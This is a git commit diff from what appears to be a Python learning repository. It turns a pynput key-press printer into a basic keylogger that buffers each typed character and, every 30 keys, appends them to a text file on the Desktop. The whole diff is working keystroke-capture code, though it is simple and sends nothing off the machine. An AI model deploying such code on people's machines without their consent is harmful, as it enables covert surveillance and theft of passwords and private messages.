b1aacef5f41d7df45d8ba6b6d91efd667bf3eec4
mehmet yel <mehmetyasinyel@hotmail.com>
2021-05-08 06:52:03 +0300

    python_learn26

--- projes/055_Keylogger.py
+++ projes/055_Keylogger.py
@@ -1,20 +1,32 @@
 from pynput.keyboard import Listener,Key
 
+liste=list()
+
 def bas(key):
+    global liste 
+
     try:
-        print(key.char, type(key.char))
+        liste.append(key.char)
     except:
         pass
 
+    if len(liste)>=30:
+        dosya_yaz()
+        liste=list()
+
 def birak(key):
 
-    print("tuş bırakıldı")
+    pass
 
 
+def dosya_yaz():
+    global liste
+
+    with open("C:/Users/Casper/Desktop/KEY.txt","a", encoding="utf8") as dosya:
+        for x in liste:
+            dosya.write(x)
+            
 with Listener(on_press=bas, on_release=birak) as dinleyici:
 
 
     dinleyici.join()
-
-
-    12
